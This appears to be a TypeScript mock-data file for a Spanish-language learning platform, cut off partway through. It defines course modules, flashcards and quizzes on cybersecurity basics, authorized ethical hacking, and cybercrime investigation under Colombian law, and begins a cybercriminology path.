import type { LearningPaths } from './types';

// This is our mock database. In a real application, this data would come from a server.
const LEARNING_PATHS_DATA: LearningPaths = {
  cybersecurity: {
    title: "Ruta: Fundamentos de Ciberseguridad",
    description: "Un viaje desde los conceptos básicos hasta las defensas activas contra las amenazas digitales más comunes.",
    lastUpdated: "Enero 2025",
    modules: [
      {
        id: 'cs_intro',
        title: "1. ¿Qué es la Ciberseguridad?",
        content: [
          { type: 'text', icon: 'ShieldCheckIcon', text: "La ciberseguridad es la práctica de proteger sistemas, redes y programas de ataques digitales." },
          { type: 'text', icon: 'ServerIcon', text: "Protegemos 'activos digitales': información valiosa como datos personales, propiedad intelectual y finanzas." },
        ]
      },
      {
        id: 'cs_concepts',
        title: "2. Conceptos Clave",
        content: [
            {
                type: 'interactive',
                title: 'Toca cada término para revelar su significado:',
                items: [
                    { term: 'Activo Digital', definition: 'Cualquier recurso digital que tiene valor, como datos, software o propiedad intelectual.' },
                    { term: 'Amenaza', definition: 'Cualquier circunstancia o evento con el potencial de causar daño a un sistema o red.' },
                    { term: 'Vulnerabilidad', definition: 'Una debilidad en un sistema que puede ser explotada por una amenaza.' },
                    { term: 'Riesgo', definition: 'La probabilidad de que una amenaza explote una vulnerabilidad y el impacto resultante.' }
                ]
            }
        ]
      },
      {
        id: 'cs_threats_video',
        title: "3. Amenazas Comunes",
        content: [
          { type: 'video', title: "¿Qué es un phishing y un malware? — Agencia Nacional de Ciberseguridad", videoId: "4Zl20jvJtho" },
          { type: 'text', icon: 'BugIcon', text: "El malware es software malicioso (virus, ransomware) diseñado para dañar sistemas." },
          { type: 'text', icon: 'FishHookIcon', text: "El phishing es un fraude donde los atacantes se hacen pasar por entidades legítimas para robar información." },
        ]
      },
      {
        id: 'cs_quiz',
        title: "4. Prueba de Conocimiento",
        content: [
          {
            type: 'quiz',
            quizData: {
              question: "¿Qué es el 'phishing'?",
              options: [
                "Un tipo de virus informático.",
                "Un intento de fraude para robar información haciéndose pasar por alguien de confianza.",
                "Un software que protege tu computadora."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "¡Correcto! El phishing se basa en el engaño y la ingeniería social.",
                incorrect: "No exactamente. El phishing es una técnica de engaño, no un tipo de software."
              }
            }
          }
        ]
      },
      {
        id: 'cs_regulations',
        title: "5. Marco Normativo",
        content: [
          {
            type: 'interactive',
            title: 'Leyes y estándares clave que todo profesional debe conocer:',
            items: [
                { term: 'GDPR (Reglamento General de Protección de Datos)', definition: 'Una ley de la Unión Europea que otorga a los individuos control sobre sus datos personales. Aplica a cualquier organización que procese datos de ciudadanos de la UE.' },
                { term: 'Leyes de Notificación de Brechas', definition: 'Regulaciones que obligan a las organizaciones a notificar a los individuos y a las autoridades si sus datos personales han sido comprometidos en una brecha de seguridad.' },
                { term: 'PCI DSS (Estándar de Seguridad de Datos)', definition: 'Un conjunto de requisitos de seguridad diseñados para garantizar que todas las empresas que procesan, almacenan o transmiten información de tarjetas de crédito mantengan un entorno seguro.' },
                { term: 'ISO/IEC 27001', definition: 'Un estándar internacional que proporciona un marco para los Sistemas de Gestión de Seguridad de la Información (SGSI) para gestionar la seguridad de los activos.' }
            ]
          }
        ]
      },
      {
        id: 'cs_defense',
        title: "6. Defensa Activa",
        content: [
          { type: 'text', icon: 'HappyUsersIcon', text: "Entender el marco legal nos ayuda a aplicar defensas efectivas y responsables como contraseñas fuertes y software antivirus." },
          { type: 'text', icon: 'CheckCircleIcon', text: "Con esto cerramos la base defensiva. A continuación pasamos al otro lado: cómo piensan y actúan quienes prueban la seguridad de un sistema con autorización." },
        ]
      },
      {
        id: 'cs_hacking_intro',
        title: "7. Hacking Ético: Marco y Autorización",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "El hacking ético es el uso de las mismas técnicas que un atacante, pero con autorización explícita del dueño del sistema, con el fin de encontrar y corregir vulnerabilidades antes de que alguien más las explote." },
          { type: 'text', icon: 'LockIcon', text: "Lo único que distingue a un pentester de un atacante no es la técnica: es la autorización por escrito. Sin un documento de 'Reglas de Enganche' (Rules of Engagement) firmado antes de empezar, la misma acción deja de ser ética y se vuelve un delito." },
          { type: 'text', icon: 'DocumentTextIcon', text: "El alcance (scope) define exactamente qué sistemas, redes o aplicaciones se pueden probar, durante qué ventana de tiempo, y qué técnicas quedan explícitamente prohibidas (por ejemplo, ataques de denegación de servicio)." },
          {
            type: 'interactive',
            title: 'Glosario: fundamentos del hacking ético',
            items: [
              { term: 'Hacking Ético', definition: 'Pruebas de seguridad autorizadas por escrito, que usan las mismas técnicas que un atacante real para encontrar vulnerabilidades antes que alguien malintencionado.' },
              { term: 'Rules of Engagement (RoE)', definition: 'Documento firmado antes de iniciar una prueba: qué se permite, qué no, y quién responde si algo sale mal.' },
              { term: 'Alcance (Scope)', definition: 'La lista exacta de sistemas, redes o aplicaciones autorizadas para la prueba — todo lo que esté fuera de esa lista no se toca.' },
              { term: 'Red Team', definition: 'Equipo que simula un ataque real y sostenido contra una organización, generalmente sin que el personal de defensa sepa la fecha exacta.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Qué distingue realmente a un pentester ético de un atacante malicioso?",
              options: [
                "El pentester usa herramientas más avanzadas que el atacante.",
                "La autorización por escrito (Rules of Engagement) antes de actuar, no la técnica usada.",
                "El pentester nunca encuentra vulnerabilidades reales."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. La técnica puede ser idéntica; lo que cambia todo es el consentimiento explícito y documentado del dueño del sistema.",
                incorrect: "No exactamente. La diferencia no está en la herramienta ni en la habilidad: está en tener autorización por escrito antes de actuar."
              }
            }
          }
        ]
      },
      {
        id: 'cs_hacking_phases',
        title: "8. Las Fases del Pentesting",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Toda prueba de penetración sigue un ciclo ordenado: Reconocimiento, Escaneo, Explotación, Post-explotación y Reporte. Saltarse fases suele producir resultados incompletos o, peor, daños no autorizados." },
          { type: 'text', icon: 'ServerIcon', text: "Reconocimiento: recolectar información pública sobre el objetivo. Escaneo: identificar sistemas activos, puertos y servicios. Explotación: intentar aprovechar una vulnerabilidad encontrada, dentro del alcance autorizado." },
          { type: 'text', icon: 'DocumentTextIcon', text: "Post-explotación: evaluar hasta dónde se podría escalar el acceso (sin hacerlo si no está autorizado). Reporte: el entregable más importante — sin un reporte claro y accionable, la prueba no tuvo valor para la organización." },
          {
            type: 'flashcards',
            title: 'Las 5 fases del pentesting',
            cards: [
              { front: 'Reconocimiento', back: 'Recolectar información pública del objetivo: dominios, empleados, tecnologías usadas, sin interactuar directamente con los sistemas.' },
              { front: 'Escaneo', back: 'Identificar activamente sistemas vivos, puertos abiertos y servicios en ejecución dentro del alcance autorizado.' },
              { front: 'Explotación', back: 'Intentar aprovechar una vulnerabilidad identificada para confirmar que es real y explotable.' },
              { front: 'Post-explotación', back: 'Evaluar el impacto potencial: qué más se podría alcanzar desde el punto comprometido.' },
              { front: 'Reporte', back: 'Documentar hallazgos, evidencia y recomendaciones de remediación de forma clara para la organización.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "¿Cuál es, según esta ruta, la fase más importante para que la organización realmente se beneficie de la prueba?",
              options: [
                "Explotación, porque es la fase más técnica.",
                "Reporte, porque sin un entregable claro y accionable la prueba no genera valor real.",
                "Reconocimiento, porque es la que más tiempo toma."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Un hallazgo que no se documenta y comunica de forma clara no se puede corregir — el reporte es lo que convierte la prueba en mejora real.",
                incorrect: "No exactamente. Todas las fases importan, pero el valor final para la organización depende del reporte: sin él, nada se corrige."
              }
            }
          }
        ]
      },
      {
        id: 'cs_hacking_frameworks',
        title: "9. Marcos y Estándares de Referencia",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "El hacking ético no se improvisa: existen marcos públicos y reconocidos internacionalmente que estandarizan cómo se planean, ejecutan y documentan estas pruebas." },
          { type: 'text', icon: 'DocumentTextIcon', text: "OWASP Testing Guide se enfoca en aplicaciones web. PTES (Penetration Testing Execution Standard) cubre el proceso completo de una prueba, desde el acuerdo inicial hasta el reporte. NIST SP 800-115 es la guía técnica de referencia del gobierno de EE.UU. para pruebas de seguridad de la información. MITRE ATT&CK documenta tácticas y técnicas reales usadas por atacantes, organizadas en una matriz pública." },
          {
            type: 'interactive',
            title: 'Glosario: marcos de referencia',
            items: [
              { term: 'OWASP Testing Guide', definition: 'Metodología de referencia para probar la seguridad de aplicaciones web, mantenida por la comunidad OWASP.' },
              { term: 'PTES', definition: 'Penetration Testing Execution Standard: cubre todo el ciclo de una prueba de penetración, desde el acuerdo previo hasta el reporte final.' },
              { term: 'NIST SP 800-115', definition: 'Guía técnica del NIST (EE.UU.) sobre cómo planear y ejecutar pruebas de seguridad de la información.' },
              { term: 'MITRE ATT&CK', definition: 'Matriz pública de tácticas y técnicas reales de atacantes, usada tanto para pruebas ofensivas como para defensa.' },
            ]
          },
          {
            type: 'memory',
            title: 'Asociar cada marco con lo que cubre',
            pairs: [
              { term: 'OWASP Testing Guide', definition: 'Metodología para probar la seguridad de aplicaciones web.' },
              { term: 'PTES', definition: 'El ciclo completo de una prueba de penetración, de inicio a fin.' },
              { term: 'NIST SP 800-115', definition: 'Guía técnica gubernamental para planear y ejecutar pruebas de seguridad.' },
              { term: 'MITRE ATT&CK', definition: 'Matriz pública de tácticas y técnicas reales de atacantes.' },
            ]
          }
        ]
      },
      {
        id: 'cs_hacking_final',
        title: "10. Buenas Prácticas y Evaluación Final",
        content: [
          { type: 'text', icon: 'LockIcon', text: "Toda la información obtenida durante una prueba de hacking ético es confidencial por defecto: credenciales, datos personales o vulnerabilidades encontradas no se comparten fuera del canal acordado con el cliente." },
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "Divulgación responsable: si se encuentra una vulnerabilidad que afecta a terceros (un proveedor, una librería de código abierto), se notifica de forma privada y se da tiempo razonable para corregirla antes de hacerla pública." },
          { type: 'text', icon: 'CheckCircleIcon', text: "Con esto completas la ruta de Fundamentos de Ciberseguridad, incluyendo la base de hacking ético: autorización, fases, marcos de referencia y buenas prácticas de reporte." },
          {
            type: 'h5p_check',
            title: 'Evaluación Final: Hacking Ético',
            description: 'Repaso integral de los 4 módulos de hacking ético de esta ruta.',
            questions: [
              {
                question: '¿Qué documento debe existir antes de iniciar cualquier prueba de hacking ético?',
                options: [
                  { id: 'hf1_o1', text: 'Las Rules of Engagement (RoE), firmadas por el dueño del sistema.', isCorrect: true, score: 10 },
                  { id: 'hf1_o2', text: 'Un certificado de antivirus actualizado del equipo del pentester.', isCorrect: false, score: 0 },
                  { id: 'hf1_o3', text: 'Un comunicado de prensa anunciando la prueba.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Sin Rules of Engagement firmadas, la prueba no tiene base legal ni ética.'
              },
              {
                question: '¿En qué fase del pentesting se confirma que una vulnerabilidad es realmente explotable?',
                options: [
                  { id: 'hf2_o1', text: 'Explotación.', isCorrect: true, score: 10 },
                  { id: 'hf2_o2', text: 'Reconocimiento.', isCorrect: false, score: 0 },
                  { id: 'hf2_o3', text: 'Reporte.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. El reconocimiento y el escaneo recolectan información; la explotación confirma el riesgo real.'
              },
              {
                question: '¿Qué marco cubre específicamente el ciclo completo de una prueba de penetración, de inicio a fin?',
                options: [
                  { id: 'hf3_o1', text: 'PTES (Penetration Testing Execution Standard).', isCorrect: true, score: 10 },
                  { id: 'hf3_o2', text: 'MITRE ATT&CK.', isCorrect: false, score: 0 },
                  { id: 'hf3_o3', text: 'OWASP Testing Guide.', isCorrect: false, score: 0 }
                ],
                feedback: '¡Excelente! PTES abarca desde el acuerdo inicial hasta el reporte final, a diferencia de los marcos más específicos como OWASP (web) o ATT&CK (tácticas de atacantes).'
              }
            ]
          }
        ]
      }
    ]
  },
  cybercrime: {
    title: "Introducción a la Investigación del Cibercrimen",
    description: "Explora las motivaciones, tipologías, marco legal colombiano, evidencia digital y metodología de investigación de los delitos cometidos en el ciberespacio.",
    lastUpdated: "Octubre 2026",
    modules: [
      {
        id: 'cc_intro',
        title: "1. El Mundo del Cibercrimen",
        content: [
          { type: 'text', icon: 'SpyIcon', text: "El cibercrimen es cualquier actividad delictiva que involucra una computadora, una red o un dispositivo en red." },
        ]
      },
      {
        id: 'cc_motivations_video',
        title: "2. ¿Por qué lo hacen? Actores y Motivaciones",
        content: [
           { type: 'video', title: "Cibercrimen transnacional: modus operandi e impacto — LISA Institute", videoId: "ZgMDI66M2DU" },
           { type: 'text', icon: 'ClosedEnvelopeIcon', text: "Las motivaciones varían desde el beneficio económico y el espionaje hasta el activismo (hacktivismo)." },
           {
             type: 'interactive',
             title: 'Perfiles de actores y sus motivaciones',
             items: [
               { term: 'Crimen organizado', definition: 'Busca beneficio económico a escala: fraude, ransomware, robo y venta de datos. Opera como una empresa, con roles especializados.' },
               { term: 'Actores estatales (APT)', definition: 'Grupos patrocinados por gobiernos que buscan espionaje, sabotaje o ventaja estratégica. Son persistentes y con muchos recursos.' },
               { term: 'Hacktivistas', definition: 'Motivados por causas políticas o sociales: desfiguran sitios web, filtran documentos o hacen ataques de denegación de servicio como protesta.' },
               { term: 'Insiders', definition: 'Personas con acceso legítimo (empleados, contratistas) que abusan de él por dinero, venganza o descuido.' },
               { term: 'Oportunistas', definition: 'Atacantes con poca habilidad que usan herramientas ya hechas contra objetivos fáciles, sin un blanco específico.' },
             ]
           },
        ]
      },
      {
        id: 'cc_quiz',
        title: "3. Prueba de Conocimiento",
        content: [
          {
            type: 'quiz',
            quizData: {
              question: "Una de las principales motivaciones detrás del cibercrimen es:",
              options: [
                "Ayudar a las empresas a ser más seguras.",
                "Probar la seguridad de las redes sin permiso.",
                "El beneficio económico."
              ],
              correctOptionIndex: 2,
              feedback: {
                correct: "¡Exacto! El beneficio económico es uno de los mayores impulsores del cibercrimen.",
                incorrect: "Aunque algunos hackers exploran sistemas, la motivación criminal suele estar ligada a ganancias."
              }
            }
          }
        ]
      },
      {
        id: 'cc_laws',
        title: "4. Leyes y Tratados",
        content: [
          {
            type: 'interactive',
            title: 'Instrumentos legales clave en la lucha contra el cibercrimen:',
            items: [
                { term: 'Convenio de Budapest sobre la Ciberdelincuencia', definition: 'El primer tratado internacional que busca abordar los delitos informáticos y por internet armonizando las leyes nacionales, mejorando las técnicas de investigación y aumentando la cooperación.' },
                { term: 'Ley de Fraude y Abuso Informático (CFAA)', definition: 'Una ley fundamental en los Estados Unidos que prohíbe el acceso no autorizado a computadoras y redes protegidas.' },
                { term: 'Legislación Local', definition: 'Cada país tiene su propio código penal que tipifica delitos como el hacking, la distribución de malware y el fraude en línea. Es crucial conocer las leyes de la jurisdicción correspondiente.' },
            ]
          }
        ]
      },
      {
        id: 'cc_impact',
        title: "5. Impacto en el Mundo Real",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Las leyes establecen el marco para perseguir el cibercrimen, que tiene consecuencias reales causando pérdidas financieras y dañando reputaciones. En los siguientes módulos pasamos de la teoría a la práctica: qué delitos se ven con más frecuencia, cómo los tipifica la ley colombiana y cómo se investigan." },
        ]
      },
      {
        id: 'cc_typologies',
        title: "6. Tipologías del Cibercrimen",
        content: [
          { type: 'video', title: "Delitos Informáticos más Comunes — Pablo Maza Abogado", videoId: "F3CUj4ZhV7I" },
          { type: 'text', icon: 'DocumentTextIcon', text: "El video presenta los delitos informáticos más comunes desde una mirada jurídica. Las leyes cambian según el país: en Colombia, estas conductas se tipifican en la Ley 1273 de 2009, que veremos en el módulo 7." },
          { type: 'text', icon: 'FishHookIcon', text: "La mayoría de los cibercrímenes no empiezan con una falla técnica sofisticada, sino con el engaño a una persona: un correo, un mensaje o una llamada que la lleva a entregar datos, dinero o acceso." },
          { type: 'text', icon: 'BugIcon', text: "Hoy el cibercrimen funciona como una economía de servicios: unos grupos venden accesos iniciales a redes comprometidas, otros alquilan su ransomware a afiliados (Ransomware-as-a-Service) y otros lavan el dinero mediante 'mulas' y criptoactivos." },
          {
            type: 'flashcards',
            title: 'Delitos frecuentes y cómo operan',
            cards: [
              { front: 'Phishing', back: 'Mensajes que suplantan a una entidad de confianza (banco, empresa, gobierno) para robar credenciales o datos. Variantes: smishing (SMS) y vishing (llamadas).' },
              { front: 'Ransomware', back: 'Malware que cifra los datos de la víctima y exige un pago para recuperarlos. Hoy suele combinarse con robo de datos y amenaza de publicarlos (doble extorsión).' },
              { front: 'BEC (Business Email Compromise)', back: 'El atacante suplanta o compromete el correo de un directivo o proveedor para ordenar transferencias o cambiar datos bancarios de pago.' },
              { front: 'SIM swapping', back: 'El delincuente logra que el operador transfiera la línea de la víctima a otra SIM, y así recibe sus códigos de verificación por SMS.' },
              { front: 'Sextorsión', back: 'Amenaza de difundir imágenes íntimas (reales o falsas) para obtener dinero o más material. Afecta especialmente a menores y jóvenes.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Una empresa recibe un correo, aparentemente de su proveedor habitual, pidiendo actualizar la cuenta bancaria para el próximo pago. ¿Qué tipología es más probable?",
              options: [
                "Ransomware.",
                "BEC (Business Email Compromise).",
                "SIM swapping."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Cambiar los datos de pago suplantando a un proveedor o directivo es el patrón clásico del BEC. La defensa es verificar por un canal distinto al correo.",
                incorrect: "No exactamente. Cuando se suplanta a un proveedor o directivo para desviar un pago, se trata de BEC (Business Email Compromise)."
              }
            }
          }
        ]
      },
      {
        id: 'cc_colombia_law',
        title: "7. Marco Legal Colombiano: Ley 1273 de 2009",
        content: [
          { type: 'text', icon: 'DocumentTextIcon', text: "En Colombia, la Ley 1273 de 2009 creó en el Código Penal un nuevo bien jurídico: 'la protección de la información y de los datos' (Título VII Bis). Desde entonces, conductas como entrar sin autorización a un sistema o usar software malicioso son delitos autónomos." },
          { type: 'text', icon: 'ShieldCheckIcon', text: "Colombia también aprobó el Convenio de Budapest mediante la Ley 1928 de 2018, lo que facilita la cooperación con otros países para preservar y obtener evidencia. La protección de datos personales se rige además por la Ley 1581 de 2012, vigilada por la Superintendencia de Industria y Comercio." },
          {
            type: 'interactive',
            title: 'Delitos de la Ley 1273 de 2009 (Código Penal)',
            items: [
              { term: 'Art. 269A — Acceso abusivo a un sistema informático', definition: 'Entrar o mantenerse en un sistema informático, en todo o en parte, sin autorización o contra la voluntad de quien tiene derecho a excluirlo.' },
              { term: 'Art. 269B — Obstaculización ilegítima de sistema informático o red', definition: 'Impedir u obstaculizar sin autorización el funcionamiento o acceso normal a un sistema, a sus datos o a una red de telecomunicaciones.' },
              { term: 'Art. 269C — Interceptación de datos informáticos', definition: 'Interceptar sin orden judicial datos informáticos en su origen, destino o dentro de un sistema.' },
              { term: 'Art. 269D — Daño informático', definition: 'Destruir, dañar, borrar, deteriorar, alterar o suprimir datos o sistemas sin estar facultado para ello.' },
              { term: 'Art. 269E — Uso de software malicioso', definition: 'Producir, traficar, distribuir, vender o introducir al país software malicioso u otros programas de efectos dañinos.' },
              { term: 'Art. 269F — Violación de datos personales', definition: 'Obtener, vender, comprar, divulgar o usar datos personales sin estar facultado, con provecho propio o de un tercero.' },
              { term: 'Art. 269G — Suplantación de sitios web para capturar datos personales', definition: 'Diseñar, vender o alojar páginas web falsas, o redirigir a las víctimas a ellas, para capturar sus datos (la base legal contra el phishing).' },
              { term: 'Art. 269I — Hurto por medios informáticos y semejantes', definition: 'Apoderarse de bienes ajenos manipulando sistemas informáticos o suplantando a un usuario ante un sistema de autenticación.' },
              { term: 'Art. 269J — Transferencia no consentida de activos', definition: 'Manipular sistemas para transferir activos sin consentimiento del titular, en perjuicio de un tercero.' },
            ]
          },
          {
            type: 'memory',
            title: 'Asocia cada conducta con su artículo',
            pairs: [
              { term: 'Art. 269A', definition: 'Entrar sin autorización a un sistema informático.' },
              { term: 'Art. 269E', definition: 'Distribuir o introducir malware.' },
              { term: 'Art. 269G', definition: 'Crear una página falsa para capturar datos.' },
              { term: 'Art. 269I', definition: 'Hurtar dinero manipulando un sistema o suplantando a un usuario.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Un estudiante entra al sistema de notas de su universidad usando la contraseña de un profesor, aunque no cambia nada. ¿Comete un delito según la Ley 1273 de 2009?",
              options: [
                "No, porque no modificó ni borró ningún dato.",
                "Sí: acceso abusivo a un sistema informático (Art. 269A), que se configura con solo entrar sin autorización.",
                "Solo si la universidad pierde dinero."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. El Art. 269A castiga el acceso sin autorización en sí mismo. No hace falta dañar ni modificar nada; eso sería un delito adicional (daño informático, Art. 269D).",
                incorrect: "No. El acceso abusivo (Art. 269A) se configura con solo entrar o mantenerse en el sistema sin autorización, aunque no se cambie ningún dato."
              }
            }
          }
        ]
      },
      {
        id: 'cc_evidence',
        title: "8. Evidencia Digital y Cadena de Custodia",
        content: [
          { type: 'text', icon: 'UserSearchIcon', text: "La evidencia digital es frágil: se modifica con solo encender un equipo o abrir un archivo. Por eso su manejo sigue reglas estrictas; si se rompen, la prueba puede ser rechazada en un juicio aunque demuestre la culpa." },
          { type: 'text', icon: 'LockIcon', text: "La cadena de custodia documenta quién recolectó cada evidencia, cuándo, cómo y por qué manos pasó hasta llegar al juez. Se complementa con el cálculo de un hash (por ejemplo SHA-256) al momento de la adquisición: si el hash coincide después, se demuestra que la evidencia no fue alterada." },
          { type: 'text', icon: 'DocumentTextIcon', text: "La norma ISO/IEC 27037 da las pautas internacionales para identificar, recolectar, adquirir y preservar evidencia digital. El RFC 3227 recomienda recolectar primero lo más volátil, porque es lo que primero se pierde." },
          {
            type: 'flashcards',
            title: 'Orden de volatilidad (de más a menos volátil)',
            cards: [
              { front: '1. Registros y caché del procesador', back: 'Desaparecen en nanosegundos. Rara vez se pueden capturar fuera de un laboratorio.' },
              { front: '2. Memoria RAM', back: 'Procesos activos, conexiones de red, claves de cifrado. Se pierde al apagar el equipo: por eso no se apaga un equipo encendido sin antes evaluar capturar la RAM.' },
              { front: '3. Estado de la red y archivos temporales', back: 'Tablas de rutas, caché ARP, conexiones abiertas y archivos temporales del sistema.' },
              { front: '4. Disco', back: 'Se adquiere con una copia forense bit a bit, usando un bloqueador de escritura para no alterar el original.' },
              { front: '5. Registros remotos y copias de respaldo', back: 'Logs en servidores externos, nube o backups. Son los menos volátiles, pero pueden rotarse o borrarse con el tiempo.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "Un investigador llega a una oficina y encuentra encendido el computador de un sospechoso. ¿Qué debe evaluar antes de apagarlo?",
              options: [
                "Nada: apagarlo de inmediato es siempre lo más seguro.",
                "Capturar la memoria RAM, porque contiene información volátil que se pierde al apagar.",
                "Abrir los archivos del escritorio para ver si hay algo relevante."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. La RAM puede contener procesos, conexiones y claves de cifrado que desaparecen al apagar. Abrir archivos, en cambio, altera la evidencia.",
                incorrect: "No. Según el orden de volatilidad, primero se evalúa capturar la RAM. Apagar sin evaluar pierde esa información, y abrir archivos modifica la evidencia."
              }
            }
          }
        ]
      },
      {
        id: 'cc_investigation',
        title: "9. Metodología de Investigación y Cooperación",
        content: [
          { type: 'text', icon: 'ServerIcon', text: "Una investigación de cibercrimen sigue un ciclo: (1) denuncia o detección del hecho, (2) preservación urgente de la evidencia, (3) adquisición y análisis forense, (4) correlación y atribución, y (5) informe para la judicialización." },
          { type: 'text', icon: 'UserSearchIcon', text: "La atribución es la fase más difícil: los delincuentes usan VPN, redes anónimas, servidores comprometidos en otros países y criptoactivos. Por eso se combinan indicadores técnicos (IP, dominios, hashes de malware) con el rastro del dinero y la inteligencia de fuentes abiertas (OSINT)." },
          { type: 'text', icon: 'ClosedEnvelopeIcon', text: "Como la evidencia suele estar en servidores de otros países, la cooperación es clave. El Convenio de Budapest creó una red de puntos de contacto disponibles 24/7 para pedir la preservación urgente de datos, mientras se tramita la solicitud formal de asistencia judicial." },
          {
            type: 'interactive',
            title: '¿A quién acudir en Colombia?',
            items: [
              { term: 'CAI Virtual — Policía Nacional', definition: 'Canal en línea del Centro Cibernético Policial para reportar incidentes y recibir orientación sobre delitos informáticos.' },
              { term: 'Fiscalía General de la Nación', definition: 'Entidad que recibe las denuncias penales, dirige la investigación y acusa ante los jueces.' },
              { term: 'Superintendencia de Industria y Comercio (SIC)', definition: 'Autoridad de protección de datos personales (Ley 1581 de 2012). Recibe quejas por el mal uso de datos personales.' },
              { term: 'Red 24/7 del Convenio de Budapest', definition: 'Puntos de contacto permanentes entre países para preservar evidencia rápidamente antes de que se pierda.' },
              { term: 'MLAT (Asistencia Judicial Mutua)', definition: 'Tratados o solicitudes formales entre Estados para obtener evidencia en otra jurisdicción. Son más lentos, por eso primero se preserva.' },
            ]
          },
          {
            type: 'quiz',
            quizData: {
              question: "La evidencia clave de un fraude está en un servidor de otro país. ¿Cuál es el primer paso más urgente?",
              options: [
                "Esperar a que se tramite la solicitud formal de asistencia judicial (MLAT).",
                "Pedir la preservación urgente de los datos por la red 24/7, para que no se borren mientras avanza el trámite formal.",
                "Acceder directamente al servidor para copiar la información."
              ],
              correctOptionIndex: 1,
              feedback: {
                correct: "Correcto. Primero se preservan los datos (red 24/7) y luego se obtienen formalmente. Acceder por cuenta propia sería un acceso abusivo y la prueba no serviría.",
                incorrect: "No. El trámite formal puede tardar meses y los datos podrían borrarse; entrar al servidor sin autorización sería un delito. Lo urgente es pedir la preservación por la red 24/7."
              }
            }
          }
        ]
      },
      {
        id: 'cc_final',
        title: "10. Evaluación Final",
        content: [
          { type: 'text', icon: 'CheckCircleIcon', text: "Con esto completas la Introducción a la Investigación del Cibercrimen: actores y motivaciones, tipologías, marco legal colombiano, evidencia digital y metodología de investigación y cooperación." },
          {
            type: 'h5p_check',
            title: 'Evaluación Final: Investigación del Cibercrimen',
            description: 'Repaso integral de los módulos del curso.',
            questions: [
              {
                question: '¿Qué tipo de actor busca principalmente espionaje o ventaja estratégica con apoyo de un gobierno?',
                options: [
                  { id: 'ccf1_o1', text: 'Un actor estatal (APT).', isCorrect: true, score: 10 },
                  { id: 'ccf1_o2', text: 'Un hacktivista.', isCorrect: false, score: 0 },
                  { id: 'ccf1_o3', text: 'Un oportunista.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Los actores estatales (APT) son persistentes, tienen muchos recursos y buscan espionaje o sabotaje.'
              },
              {
                question: '¿Qué ataque permite al delincuente recibir los códigos de verificación por SMS de la víctima?',
                options: [
                  { id: 'ccf2_o1', text: 'SIM swapping.', isCorrect: true, score: 10 },
                  { id: 'ccf2_o2', text: 'Ransomware.', isCorrect: false, score: 0 },
                  { id: 'ccf2_o3', text: 'Phishing por correo.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Con el SIM swapping la línea de la víctima pasa a otra SIM, y con ella sus códigos por SMS.'
              },
              {
                question: 'Crear una página falsa de un banco para capturar las credenciales de sus clientes corresponde al artículo:',
                options: [
                  { id: 'ccf3_o1', text: '269G — Suplantación de sitios web para capturar datos personales.', isCorrect: true, score: 10 },
                  { id: 'ccf3_o2', text: '269B — Obstaculización ilegítima de sistema informático.', isCorrect: false, score: 0 },
                  { id: 'ccf3_o3', text: '269C — Interceptación de datos informáticos.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. El Art. 269G es la base legal para perseguir el phishing con sitios falsos.'
              },
              {
                question: '¿Para qué sirve calcular el hash de una evidencia digital al adquirirla?',
                options: [
                  { id: 'ccf4_o1', text: 'Para demostrar después que la evidencia no fue alterada.', isCorrect: true, score: 10 },
                  { id: 'ccf4_o2', text: 'Para cifrar la evidencia y que nadie la pueda leer.', isCorrect: false, score: 0 },
                  { id: 'ccf4_o3', text: 'Para comprimirla y que ocupe menos espacio.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Si el hash calculado al final coincide con el original, la integridad de la evidencia queda demostrada.'
              },
              {
                question: 'Según el orden de volatilidad, ¿qué se debe recolectar primero?',
                options: [
                  { id: 'ccf5_o1', text: 'La memoria RAM.', isCorrect: true, score: 10 },
                  { id: 'ccf5_o2', text: 'Las copias de respaldo.', isCorrect: false, score: 0 },
                  { id: 'ccf5_o3', text: 'El disco duro.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. Entre lo que normalmente se puede capturar, la RAM es lo más volátil: se pierde al apagar el equipo.'
              },
              {
                question: '¿Qué mecanismo del Convenio de Budapest permite pedir la preservación urgente de datos en otro país?',
                options: [
                  { id: 'ccf6_o1', text: 'La red de puntos de contacto 24/7.', isCorrect: true, score: 10 },
                  { id: 'ccf6_o2', text: 'Una queja ante la Superintendencia de Industria y Comercio.', isCorrect: false, score: 0 },
                  { id: 'ccf6_o3', text: 'Una publicación en redes sociales.', isCorrect: false, score: 0 }
                ],
                feedback: 'Correcto. La red 24/7 preserva los datos rápido, mientras se tramita la solicitud formal de asistencia judicial (MLAT).'
              }
            ]
          }
        ]
      }
    ]
  },
  cybercriminology: {
    title: "Ruta: Principios de Cibercriminología",
    description: "Una introducción al estudio del comportamiento, motivaciones y características de los cibercriminales.",
    lastUpdated: "Enero 2025",
    modules: [
        {
            id: 'ccy_intro',
            title: "1. El 'Porqué' del Crimen",
            content: [
                { type: 'text', icon: 'BrainCircuitIcon', text: "La cibercriminología estudia por qué las personas cometen delitos en el ciberespacio, analizando factores psicológicos y sociales." },
                { type: 'text', icon: 'UserSearchIcon', text: "No existe un único perfil, pero se estudian patrones: desde jóvenes curiosos hasta crimen organizado." },
            ]
        },
        {
            id: 'ccy_psychology_video',
            title: "2. La Psicología del Hacker",
            content: [
